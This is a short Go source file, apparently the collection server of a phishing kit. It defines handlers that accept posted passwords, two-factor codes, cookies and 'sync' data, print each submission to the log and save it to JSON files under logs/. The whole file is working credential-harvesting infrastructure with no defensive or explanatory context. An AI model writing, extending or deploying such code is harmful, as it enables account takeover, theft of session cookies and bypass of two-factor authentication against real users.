package capture

import (
	"encoding/json"
	"log"
	"net/http"
	"os"
	"time"
)

func PassHandler(w http.ResponseWriter, r *http.Request) {
	handleGenericCapture("pass.json", w, r)
}

func TwoFAHandler(w http.ResponseWriter, r *http.Request) {
	handleGenericCapture("2fa.json", w, r)
}

func CookieHandler(w http.ResponseWriter, r *http.Request) {
	handleGenericCapture("cookie.json", w, r)
}

func SyncHandler(w http.ResponseWriter, r *http.Request) {
	handleGenericCapture("sync.json", w, r)
}

func handleGenericCapture(file string, w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	var payload map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "bad", http.StatusBadRequest)
		return
	}

	payload["timestamp"] = time.Now().Format(time.RFC3339)
	data, _ := json.MarshalIndent(payload, "", "  ")
	log.Printf("📩 [%s] %s", file, string(data))

	os.MkdirAll("logs", 0700)
	os.WriteFile("logs/"+file, append(data, '\n'), 0644)

	w.WriteHeader(http.StatusOK)
}
